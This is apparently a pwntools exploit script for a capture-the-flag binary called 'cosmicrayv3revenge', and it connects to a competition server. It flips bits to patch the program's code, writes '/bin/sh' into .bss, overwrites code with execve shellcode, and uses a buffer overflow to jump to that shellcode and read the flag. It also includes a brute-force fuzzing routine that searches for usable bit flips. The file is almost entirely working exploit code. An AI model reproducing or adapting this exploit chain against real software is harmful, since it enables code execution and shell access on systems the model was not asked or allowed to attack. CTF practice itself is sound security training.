#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './cosmicrayv3revenge_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc-2.35.so'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'vsc.tf', 7005

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
breakrva 0x4015fa
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec cosmicrayv3
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

COUNT = 0
def flip_bit(where, pos, next=True):
    global COUNT
    log.info('COUNT: %d', COUNT)
    io.sendlineafter(b'through:', hex(where).encode())
    io.sendlineafter(b'flip:', str(pos).encode())

    # back to main
    sleep(0.2)
    if COUNT < 3 and next: # idk why, but it must be this way
        io.send((b'A' * 54 + p64(0x04015f5))[:0x3c]) 
    elif next:
        io.send((b'A' * 54 + p64(0x04015f5)))
    COUNT += 1

def string_modify(base, old, new):
    to_change = bytes(a ^ b for a, b in zip(old, new))
    to_change_bytes = [format(byte, '08b') for byte in to_change]

    for byte in range(len(to_change_bytes)):
        for bit in range(len(to_change_bytes[byte])):
            if to_change_bytes[byte][bit] == '1':
                flip_bit(base + byte, bit)

def modify_byte(base, old, new):
    to_change = old ^ new
    to_change_bits = format(to_change, '08b')
    for bit in range(8):
        if to_change_bits[bit] == '1':
            flip_bit(base, bit)

def fuzz():
    global io
    context.log_level = 'debug'

    # some address range between cosmic's ret and cosmic's write
    for addr in range(0x04015a4, 0x4015aa):
        print(f'Trying [{hex(addr)}] ', end='')
        for pos in range(8):
            io = initialize()
            print(f',{pos} ', end='')
            flip_bit(addr, pos)

            try:
                io.recvuntil(b'through')
                log.warning(f'Success Combination: {hex(addr)} | {pos}')
                io.interactive()
            except:
                io.close()
                continue
        print()

    # some address after between main calls to cosmic
    for addr in range(0x4015fa, 0x0401604):
        print(f'Trying [{hex(addr)}] ', end='')
        for pos in range(8):
            io = initialize()
            print(f',{pos} ', end='')
            log.warning(f'Trying [{hex(addr)}] {pos}')
            flip_bit(addr, pos)

            try:
                io.recvuntil(b'through')
                log.warning(f'Success Combination: {hex(addr)} | {pos}')
                io.interactive()
            except:
                io.close()
                continue

        print()

def exploit():
    global io
    io = initialize()

    # change `mov eax, 0x3c` to `mov edx, 0x3c`
    # changed `syscall exit` to `syscall read`
    # overwrite ret address to main
    flip_bit(0x4015fa, 6)

    # mov edx,0x3c => mov edx,0xff
    modify_byte(0x4015fb, 0x3c, 0xff)

    # write /bin/sh to .bss
    string_modify(0x404020 + 0x200, b'\x00'*8, b'/bin/sh\x00')

    # writing custom `pop rax; pop rdi; pop rsi; pop rdx; ret; syscall; ret; pop rax; nop;`
    opcodes = [  0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC7, 0x20, 0x42, 0x40, 0x00, 0x48, 0xC7, 0xC6, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05 ]
    for i in range(len(opcodes)):
        modify_byte(0x4011d0+i, elf.read(0x4011d0+i, 1)[0], opcodes[i])

    flip_bit(elf.bss(), 0, next=False)
    sleep(0.2)
    payload = b'A' * (0x3c - 6) + p64(0x4011d0)
    io.sendline(payload)

    sleep(0.2)
    io.sendline(b'cat f*')

    io.interactive()
    
if __name__ == '__main__':
    # fuzz()
    exploit()